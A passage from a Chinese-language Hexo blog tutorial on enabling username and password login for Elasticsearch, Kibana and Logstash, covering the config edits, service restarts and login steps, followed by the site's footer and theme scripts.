href="#3-修改Kibana配置" class="headerlink" title="3 修改Kibana配置"></a>3 修改Kibana配置</h1><p>vi /etc/kibana/kibana.yml</p><pre><code>elasticsearch.username: &quot;kibana_system&quot;
elasticsearch.password: &quot;kibana*2020&quot;</code></pre><p>重启Kibana</p><pre><code>[root@ids0001 ~]# systemctl restart kibana
[root@ids0001 ~]# systemctl status kibana</code></pre><h1 id="4-修改logstash配置"><a href="#4-修改logstash配置" class="headerlink" title="4  修改logstash配置"></a>4 修改logstash配置</h1><p>3 配置logstash</p><p>vi /etc/logstash/conf.d/logstash.conf</p><p><img src="/2020/09/11/elk-login/1603959501523.png" alt="1603959501523"></p><p>重启logstash</p><pre><code>/usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf</code></pre><h1 id="4登录"><a href="#4登录" class="headerlink" title="4登录"></a>4登录</h1><h2 id="4-1-登陆elasticsearch"><a href="#4-1-登陆elasticsearch" class="headerlink" title="4.1 登陆elasticsearch"></a>4.1 登陆elasticsearch</h2><p><img src="/2020/09/11/elk-login/1603959003797.png" alt="1603959003797"></p><h2 id="4-2-登陆kibana使用elasticsearch"><a href="#4-2-登陆kibana使用elasticsearch" class="headerlink" title="4.2 登陆kibana使用elasticsearch"></a>4.2 登陆kibana使用elasticsearch</h2><p>输入用户名：elastic和logstash.conf中的密码，</p><p><img src="/2020/09/11/elk-login/1603958930073.png" alt="1603958930073"></p><p><img src="/2020/09/11/elk-login/1603974376447.png" alt="1603974376447"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wsdc0521/article/details/106344974">ELK系列(九)、配置ES和Kibana的用户密码</a></p><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><div class="article-tag tagcloud"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/" rel="tag">安装教程</a></li></ul></div><span class="post-count">总字数375</span> <span class="post-count">预计阅读1分钟</span></div><div class="clearfix"></div></div></div></article><nav id="page-nav"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a></nav></div><footer id="footer"><div class="outer"><div id="footer-info"><div class="footer-left"><i class="fa fa-copyright"></i> 2017-2021 冀-18010769-1</div><div class="visit"><span id="busuanzi_container_site_pv" style="display:none"><span id="site-visit" title="本站到访人数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span> </span></span><span>| </span><span id="busuanzi_container_page_pv" style="display:none"><span id="page-visit" title="本站总访问量"><i class="fa fa-eye" aria-hidden="true"></i><span id="busuanzi_value_site_pv"></span></span></span></div><div class="footer-right"><i class="fa fa-heart"></i><a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架"> Hexo</a> Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a></div></div></div></footer></div><script type="application/javascript">var leftWidth,hide=!1;$(".hide-left-col").click(function(){hide=hide?($(".left-col").css("width",leftWidth),$(".left-col .intrude-less").fadeIn(200),$("#tocButton").fadeIn(200),"block"===$("#switch-btn").css("display")&&"block"===$("#switch-area").css("display")||$("#toc").fadeIn(200),$(".hide-left-col").css("left",leftWidth).html('<i class="fa fa-angle-double-left"></i>'),$(".mid-col").css("left",leftWidth),$("#post-nav-button").css("left",leftWidth),$("#post-nav-button > a:nth-child(2)").css("display","block"),!1):(leftWidth=$(".left-col")[0].style.width,$(".left-col").css("width",0),$(".left-col .intrude-less").fadeOut(200),$("#toc").fadeOut(100),$("#tocButton").fadeOut(100),$(".hide-left-col").css("left",0).html('<i class="fa fa-angle-double-right"></i>'),$(".mid-col").css("left",0),$("#post-nav-button").css("left",0),$("#post-nav-button > a:nth-child(2)").css("display","none"),$(".post-list").is(":visible")&&($("#post-nav-button .fa-bars,#post-nav-button .fa-times").toggle(),$(".post-list").toggle()),!0)})</script><script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.3.5/require.min.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax:{inlineMath:[["$$","$$"],["$","$"],["\\(","\\)"]],processEscapes:!0,skipTags:["script","noscript","style","textarea","pre","code"]}}),MathJax.Hub.Queue(function(){var a,e=MathJax.Hub.getAllJax();for(a=0;a<e.length;a+=1)e[a].SourceElement().parentNode.className+=" has-jax"})</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML" async></script><div class="scroll" id="scroll"><a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a> <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a> <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a></div><script>var oOpenInNew={post:".copyright a[href]",friends:"#js-friends a",socail:".social a"};for(var x in oOpenInNew)$(oOpenInNew[x]).attr("target","_blank")</script><script>var titleTime,originTitle=document.title;document.addEventListener("visibilitychange",function(){document.hidden?(document.title="(つェ⊂)"+originTitle,clearTimeout(titleTime)):(document.title="(*´∇｀*)~ "+originTitle,titleTime=setTimeout(function(){document.title=originTitle},2e3))})</script><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><link href="//cdn.bootcss.com/aos/2.2.0/aos.css" rel="stylesheet"><script type="text/javascript">AOS.init({easing:"ease-out-back",once:!0})</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"live2d_models/live2d-widget-model-izumi"},"display":{"position":"right","width":100,"height":200,"hOffset":-50,"vOffset":-85},"mobile":{"show":false},"react":{"opacityDefault":0.9,"opacityOnHover":0.3},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false});</script></body></html>